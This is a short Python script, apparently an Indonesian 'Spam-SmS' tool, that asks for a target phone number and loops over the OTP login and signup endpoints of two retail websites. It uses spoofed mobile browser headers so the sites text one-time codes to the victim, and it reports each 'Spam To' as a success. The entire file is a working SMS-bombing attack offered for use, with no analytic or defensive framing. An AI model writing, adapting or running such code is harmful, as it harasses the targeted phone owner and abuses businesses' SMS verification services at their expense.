import os,sys,time,re,requests,json
from requests import post
from time import sleep
def marco():
    ua={
    "Host": "www.idmarco.com",
    "accept": "*/*",
    "x-requested-with": "XMLHttpRequest",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36"
    }
    d={"phone":no}
    r = requests.post("https://www.idmarco.com/smsotp/login/sendotp/", data=d, headers=ua)
    if r:
        print (f"\033[1;37m[\033[1;31m+\033[1;37m]Spam To \033[90m-\033[1;31m{no}\033[90m- \033[1;92mSuccess\033[1;97m[\033[1;31m+\033[1;97m]")
def mapclub():
    ua={
    "Host": "cmsapi.mapclub.com",
    "Connection": "keep-alive",
    "Accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "content-type": "application/json",
    "Origin": "https://www.mapclub.com",
    "Referer": "https://www.mapclub.com/en/user/signup",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    dat=json.dumps({"phone":no})
    r = requests.post("https://cmsapi.mapclub.com/api/signup-otp", data=dat, headers=ua).text
    if "ok" in r:
        print (f"\033[1;37m[\033[1;31m+\033[1;37m]Spam To \033[90m-\033[1;31m{no}\033[90m- \033[1;36mSuccess\033[1;97m[\033[1;31m+\033[1;97m]")
    else:
        print ("\033[1;31mFAILED!!!")
        sys.exit()
os.system("clear")
os.system("figlet Spam-SmS")
print ("""
\033[90m=======================================
\033[1;37mAuthor \033[1;31m : \033[1;37Tegar Store
\033[1;37mYoutube \033[1;31m : \033[1;37Tegar Gaming
\033[;1;37mGithub \033[1;31m : \033[1;37mhttps://github.com/TegarStore
\033[90m=======================================""")
print ("\033[1;37mMASUKKAN NOMOR TANPA \033[1;31m0 \033[1;37mDAN TANPA \033[1;31m+62")
no = input("\033[1;37mNOMOR TARGET \033[1;31m: \033[1;31m")
for i in range(1,4):
    sleep(1)
    marco()
    mapclub()